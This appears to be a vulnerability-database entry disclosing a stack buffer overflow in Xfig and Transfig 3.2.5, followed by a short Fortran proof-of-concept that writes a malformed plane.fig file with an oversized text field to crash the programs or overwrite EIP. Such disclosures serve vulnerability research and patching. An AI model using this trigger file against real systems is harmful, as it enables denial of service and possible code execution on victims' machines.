source: http://www.securityfocus.com/bid/37193/info

Xfig and Transfig are prone to a buffer-overflow vulnerability because they fail to perform adequate boundary checks on user-supplied input.

Attackers may leverage this issue to execute arbitrary code in the context of the application. Failed attacks will cause denial-of-service conditions.

Xfig and Transfig 3.2.5 are vulnerable; other versions may also be affected. 

       PROGRAM XFIG_POC

CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
C
C      XFIG <= 3.2.5B BUFFER OVERFLOW
C      TRANSFIG <= 3.2.5A (FIG2DEV SOFT) BUFFER OVERFLOW
C      WWW.XFIG.ORG
C
C      AUTHORS:
C      * PEDAMACHEPHEPTOLIONES <pedamachepheptoliones@gmail.com>
C      * D.B. COOPER
C
C      PROBLEM:
C      A STACK-BASED BUFFER OVERFLOW OCCURS IN read_1_3_textobject()
C      WHEN READING MALFORMED .FIG FILES
C      EIP IS OVERWRITTEN SO IT'S NOT JUST A CRASH
C
C      TEST:
C      xfig plane.fig
C      fig2dev -L png plane.fig
C      (IT DOESN'T HAVE TO BE "PNG")
C
C      SOLUTION:
C      DON'T TAKE .FIG CANDY FROM STRANGERS
C
C      OLDSKOOL FORTRAN POCS FTW
C
CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC

       INTEGER I
       CHARACTER(LEN=167) :: STR

       DO 10 I=1,167
       STR(I:I)='Z'
10     CONTINUE

       OPEN(11,FILE='plane.fig')
       WRITE(11,*) '0 1 2 3'
       WRITE(11,*) '4'
       WRITE(11,*) '1 2 3 4 5 6 7 '//STR
       CLOSE(11)

       WRITE(*,*) 'GREETZ: BACKUS AND BACCHUS'

       END PROGRAM XFIG_POC